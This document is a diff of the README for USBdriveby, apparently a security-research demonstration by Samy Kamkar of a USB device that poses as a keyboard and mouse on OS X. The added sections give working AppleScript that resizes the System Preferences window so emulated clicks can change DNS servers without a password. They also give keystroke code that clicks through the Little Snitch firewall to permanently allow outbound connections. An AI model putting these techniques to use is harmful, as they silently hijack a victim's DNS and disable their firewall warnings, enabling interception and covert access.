@@ -8,8 +8,8 @@ by [@SamyKamkar](https://twitter.com/samykamkar) // <code@samy.pl> // <http://sa
 
 Code available on [github](https://github.com/samyk/usbdriveby)
 
-<a href="http://www.youtube.com/watch?feature=player_embedded&v=4aRw0FYdf_4
-" target="_blank"><img src="http://img.youtube.com/vi/4aRw0FYdf_4/0.jpg" alt="USBdriveby" width="640" height="480" border="10" /></a>
+<a href="http://www.youtube.com/watch?feature=player_embedded&v=aSLEq7-hlmo
+" target="_blank"><img src="http://img.youtube.com/vi/aSLEq7-hlmo/0.jpg" alt="USBdriveby" width="640" height="480" border="10" /></a>
 
 ------
 
@@ -69,6 +69,67 @@ You could also use perl in lieu of netcat again:
 ### Chain
 Get a cool chain so you can wear your USBdriveby device around as a pendant. You'll get compliments on your jewelry, but little do they know...
 
+
+-----
+# Overriding DNS Servers
+In OS X, if you attempt to adjust DNS servers via `networksetup -setdnsservers`, it asks for a password.
+
+If you try modifying `/etc/resolv.conf`, it asks for a password.
+
+If you try moving a window to a specific position on the screen via accessibility settings, it asks for a password.
+
+However, if you can go into the Network settings and **manually** click some buttons that the system prevents you from clicking with the keyboard, you can adjust settings **without** a password.
+
+Since we can emulate a mouse, we can actually click on these buttons! Unfortunately we have no idea where on the screen the button will reside, and the system won't let us reposition the System Preferences window...or so they believe.
+
+One feature that is **not** restricted is resizing a window, but while resizing, you can actually specificy where the resizing is to occur, evading the positional security! Once you resize the window via AppleScript, we can position it in the top left corner, and always know where the "OK" and "Apply" buttons will be relative to that point.
+
+We also need to know where our mouse position is, which realistically we will no idea. So we can simply run our mouse to the top left of the screen, much further than it will go, and then we can assume we'll be essentially the same position as the window, and then can move relatively from there. If we run into hot corners, we can just hit the corner again.
+
+Here's the AppleScript that evades this:
+
+```
+# Ironically if we attempt to set the *position* of the window,
+# we are either required to authenticate or we get an error, eg:
+#		set position of first window of application process "System Preferences" to {100, 100}
+# 31:114: execution error: System Events got an error: osascript is not allowed assistive access. (-1719)
+#
+# Additionally, running `networkscript` from the command line also requires authority.
+#
+# We evade this by changing the *bounds* of the window, and ultimately placing it in
+# a location that we know we can access by strategically manipulating the mouse.
+
+tell application "System Events"
+	set pwnBounds to {0, 0, 700, 700}
+	set bounds of window "System Preferences" of application "System Preferences" to pwnBounds
+end tell
+```
+
+-----
+# Evading the Little Snitch Firewall
+Ironically, the Little Snitch firewall conveniently allows you to use keyboard shortcuts to permanently allow outbound connections from our software! We simply send the right keystrokes (up up up left left enter), and voila. We never have to worry about it again.
+
+![http://samy.pl/usbdriveby/snitch.jpg](http://samy.pl/usbdriveby/snitch.jpg)
+
+If the user does **not** have Little Snitch installed, we want to avoid hitting the up arrow in Terminal as we may accidentally launch a previous command, so we can also send a Cmd+C to "kill" the current line in Terminal, where Cmd+C does nothing in the Little Snitch modal.
+
+```
+  // move our keyboard using the arrow keys to allow this host permanently ;)
+  // ^ ^ ^ < < enter
+  k(KEY_UP);
+  k(KEY_UP);
+  k(KEY_UP);
+  k(KEY_LEFT);
+  k(KEY_LEFT);
+
+  // go to beginning of line if there's no little snitch (CMD+A) 
+  // since we would still be in terminal
+  ctrl(KEY_A);  // go to beginning of line (cmd+a)
+  shift(KEY_3); // add a # (shift+3)
+  ctrl(KEY_C);  // ^C to exit line (cmd+c)
+
+  k(KEY_ENTER); // submit little snitch
+```
 
 -----
 
